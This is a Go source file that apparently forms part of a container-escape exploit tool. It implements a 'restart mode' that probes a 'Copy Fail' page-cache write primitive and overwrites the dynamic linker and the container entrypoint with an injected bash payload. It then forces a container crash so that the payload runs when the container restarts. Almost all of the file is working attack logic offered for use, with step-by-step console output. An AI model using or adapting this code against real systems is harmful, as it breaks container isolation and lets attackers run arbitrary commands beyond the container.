//go:build linux

package main

import (
	"fmt"
	"time"
)

// --- Exploit: restart mode ---

func preflightRestart(cmd string, pid int, timeout time.Duration, autoRestore bool, restartTarget string) error {
	payload := bashPayload(payloadCommand(cmd, autoRestore))
	injector, err := patchInjector(payload)
	if err != nil {
		return fmt.Errorf("prepare injector: %w", err)
	}
	entrypoint, warnings, err := resolveEntrypoint(pid)
	if err != nil {
		return fmt.Errorf("resolve entrypoint: %w", err)
	}
	if restartTarget != "" {
		warnings = append(warnings, fmt.Sprintf("restart target override: %s (actual PID %d exe: %s)", restartTarget, pid, entrypoint))
		entrypoint = restartTarget
	}
	interpreter, interpErr := elfInterpreter(entrypoint)
	if interpErr != nil {
		warnings = append(warnings, fmt.Sprintf("could not read entrypoint PT_INTERP: %v", interpErr))
	} else {
		warnings = append(warnings, fmt.Sprintf("entrypoint PT_INTERP: %s", interpreter))
	}

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (restart preflight)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	printAutoRestore(autoRestore)
	fmt.Printf("[*] PID: %d\n\n", pid)
	printRestartPreflight(pid, len(payload), len(injector), entrypoint, timeout, warnings)

	var copyFailErr error

	fmt.Println("[*] Copy Fail probe")
	if err := probeCopyFail(); err != nil {
		copyFailErr = err
		fmt.Printf("    [-] %v\n\n", err)
	} else {
		fmt.Println("    [+] Probe succeeded on temporary file")
		fmt.Println()
	}

	linkerReports := inspectLinkerCandidates(len(injector))
	suidReports := inspectSUIDCandidates(len(payload))
	printLinkerReport(linkerReports)
	printSUIDReport(suidReports)
	assessment := assessRestartEscape(pid, len(injector), entrypoint, copyFailErr)
	printEscapeAssessment(assessment)

	entrypointOK := true
	fmt.Println("[*] Entrypoint check")
	if err := validateShebangTarget(entrypoint); err != nil {
		entrypointOK = false
		fmt.Printf("    [-] %v\n\n", err)
	} else {
		fmt.Printf("    [+] %s can hold shebang patch\n\n", entrypoint)
	}

	fmt.Println("[*] Crash trigger check")
	crashReport := inspectCrashTrigger(crashOptions{PID: pid, Timeout: timeout})
	if crashReport.CgroupKillOK {
		fmt.Printf("    [+] cgroup.kill writable: %s\n", crashReport.CgroupKillDetail)
	} else {
		fmt.Printf("    [!] cgroup.kill blocked: %s\n", crashReport.CgroupKillDetail)
	}
	if crashReport.SIGINTLikelyOK {
		fmt.Printf("    [+] SIGINT clean shutdown: %s\n", crashReport.SIGINTDetail)
	} else {
		fmt.Printf("    [!] SIGINT clean shutdown not detected: %s\n", crashReport.SIGINTDetail)
	}
	fmt.Println()

	return printPreflightVerdict(preflightVerdictInput{
		CopyFailOK:     copyFailErr == nil,
		EntrypointOK:   entrypointOK,
		CrashOK:        crashReport.CgroupKillOK || crashReport.SIGINTLikelyOK,
		CrashUncertain: !crashReport.CgroupKillOK && !crashReport.SIGINTLikelyOK,
		Linkers:        linkerReports,
		SUID:           suidReports,
	})
}

func exploitRestart(cmd string, pid int, timeout time.Duration, autoRestore bool, restartTarget string) error {
	payload := bashPayload(payloadCommand(cmd, autoRestore))
	injector, err := patchInjector(payload)
	if err != nil {
		return fmt.Errorf("prepare injector: %w", err)
	}
	entrypoint, warnings, err := resolveEntrypoint(pid)
	if err != nil {
		return fmt.Errorf("resolve entrypoint: %w", err)
	}
	if restartTarget != "" {
		warnings = append(warnings, fmt.Sprintf("restart target override: %s (actual PID %d exe: %s)", restartTarget, pid, entrypoint))
		entrypoint = restartTarget
	}
	interpreter, interpErr := elfInterpreter(entrypoint)
	if interpErr != nil {
		warnings = append(warnings, fmt.Sprintf("could not read entrypoint PT_INTERP: %v", interpErr))
	} else {
		warnings = append(warnings, fmt.Sprintf("entrypoint PT_INTERP: %s", interpreter))
	}

	fmt.Println()
	fmt.Println("[*] Page Cache Container Escape (restart mode)")
	fmt.Printf("[*] Payload: %s\n", cmd)
	printAutoRestore(autoRestore)
	fmt.Printf("[*] PID: %d\n\n", pid)
	printRestartPreflight(pid, len(payload), len(injector), entrypoint, timeout, warnings)

	fmt.Println("[*] Step 0: Probing Copy Fail support...")
	copyFailErr := probeCopyFail()
	if copyFailErr != nil {
		printEscapeAssessment(assessRestartEscape(pid, len(injector), entrypoint, copyFailErr))
		return fmt.Errorf("copy fail unsupported, patched, or inconclusive: %w", copyFailErr)
	}
	fmt.Println("[+] Step 0: Copy Fail probe succeeded")
	fmt.Println()
	printEscapeAssessment(assessRestartEscape(pid, len(injector), entrypoint, nil))

	if err := validateShebangTarget(entrypoint); err != nil {
		return fmt.Errorf("restart preflight failed: %w; use exec mode if restart prerequisites cannot be satisfied", err)
	}

	fmt.Println("[*] Step 1: Overwriting dynamic linker...")
	if err := writeInjectorBytes(injector); err != nil {
		return fmt.Errorf("step 1 failed: %w; if no usable linker can be created, use exec mode", err)
	}
	fmt.Println("[+] Step 1: Done")
	fmt.Println()

	fmt.Println("[*] Step 2: Overwriting container entrypoint...")
	if err := writeShebang(entrypoint); err != nil {
		return fmt.Errorf("step 2 failed: %w", err)
	}
	fmt.Println("[+] Step 2: Done")
	fmt.Println()

	fmt.Println("[*] Step 3: Triggering container crash...")
	if err := crashContainer(crashOptions{PID: pid, Timeout: timeout}); err != nil {
		return fmt.Errorf("step 3 failed: %w", err)
	}
	fmt.Println("[+] Step 3: Crash triggered")
	return nil
}

func printAutoRestore(enabled bool) {
	if enabled {
		fmt.Println("[*] Auto-restore: enabled (echo 3 > /proc/sys/vm/drop_caches)")
		return
	}
	fmt.Println("[*] Auto-restore: disabled")
}
